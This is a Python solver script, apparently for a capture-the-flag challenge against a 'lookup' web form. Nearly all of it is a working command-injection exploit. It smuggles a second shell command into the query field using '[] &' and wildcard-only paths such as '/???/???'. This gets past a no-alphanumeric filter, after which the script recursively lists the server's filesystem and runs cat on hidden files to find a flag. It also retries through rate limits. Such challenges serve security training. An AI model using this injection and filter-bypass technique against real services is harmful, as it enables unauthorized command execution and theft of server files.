import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

from requests import Response
from bs4 import BeautifulSoup
import json

URL = "https://lookup.quoccacorp.com"
CACHE_FILENAME = "lookup2.visited.json"
CATTED_PATHS_FILENAME = "lookup2.catted_paths.json"

class Solver:
    def __init__(self):
        self.session = get_session()
        self.visited = set()
        self.catted_paths = self.load_catted_paths()

    def load_catted_paths(self) -> list[str]:
        try:
            with open(CATTED_PATHS_FILENAME, "r") as f:
                self.visited = set(json.load(f))
        except Exception:
            self.visited = set()
        return sorted(self.visited)

    def lookup(self, query: str) -> Response:
        assert not any(char.isalnum() for char in query)
        while True:
            response = self.session.post(URL, data={"query": query})
            if response.status_code != 429:
                return response

    def get_lookup_results(self, response: Response) -> list[str]:
        soup = BeautifulSoup(response.text, "html.parser")
        pre_text = soup.find("div", class_="alert-dark").find("pre").get_text(strip=True)
        return pre_text.splitlines()

    def get_distinct_lengths(self, list: list[str]) -> list[int]:
        return sorted({len(result) for result in list}, reverse=True)

    def get_full_paths(self, lookup_query_path: str, lookup_results: list[str]) -> list[str]:
        # ['/lib64:', 'ld-linux-x86-64.so.2', '/media:'] should return ['/lib64/ld-linux-x86-64.so.2', '/media']
        # ['/quocca/flag'] should return ['/quocca/flag']
        # if the file is not part of a directory, it should be added to the path

        assert not any(char.isalnum() for char in lookup_query_path)

        full_paths = []
        curr_dir = None

        for result in lookup_results:
            if result.endswith(':'):
                curr_dir = result.rstrip(':')
                full_paths.append(curr_dir)
            elif curr_dir:
                full_paths.append(f"{curr_dir.rstrip('/')}/{result}")
            elif result.startswith('/'):
                full_paths.append(result)
            else:
                full_paths.append(f"{lookup_query_path.rstrip('/')}/{result}")

        print(full_paths)
        return full_paths

    def get_next_lookup_query_paths(self, lookup_query_path: str, lookup_results: list[str]) -> list[str]:
        next_lookup_queries = set()

        full_paths = self.get_full_paths(lookup_query_path, lookup_results)
        for full_path in full_paths:
            if "proc" in full_path or "hpet" in full_path:
                continue
            next_lookup_queries.add(self.replace_with_wildcards(full_path))
        next_lookup_queries = sorted(next_lookup_queries)

        return next_lookup_queries

    def find_paths_dfs(self, path: str) -> list[str]:
        if path in self.visited:
            return []
        self.visited.add(path)
        print(path)

        response = self.lookup(path)
        results = self.get_lookup_results(response)
        filename_lengths = self.get_distinct_lengths(results)

        if not results:
            return []

        for next_path in self.get_next_lookup_query_paths(path, results):
            next_path = self.replace_with_wildcards(next_path)

            self.find_paths_dfs(next_path)

    def replace_with_wildcards(self, path: str) -> str:
        return ''.join('?' if char != '/' else char for char in path)

    def cat(self, path: str) -> Response:
        CAT_PATH = "/bin/cat"
        return self.lookup(f"[] & {self.replace_with_wildcards(CAT_PATH)} {path}")

    def main(self):
        # try:
        #     self.find_paths_dfs("/???")
        #     print(f"{self.visited = }")

        #     for path in self.visited:
        #         if path not in self.catted_paths:
        #             print(f"cat {path}")
        #             response = self.cat(path)
        #             find_flag(response.text)
        #             print(response.text)
        #             self.catted_paths.append(path)
        # finally:
        #     with open(CACHE_FILENAME, "w") as f:
        #         json.dump(sorted(self.visited), f, indent=2)
        #     with open(CATTED_PATHS_FILENAME, "w") as f:
        #         json.dump(sorted(self.catted_paths), f, indent=2)

        for i in range(10):
            response = self.cat("/*" * i + "/.*")
            print(response.text)
            find_flag(response.text)

if __name__ == "__main__":
    Solver().main()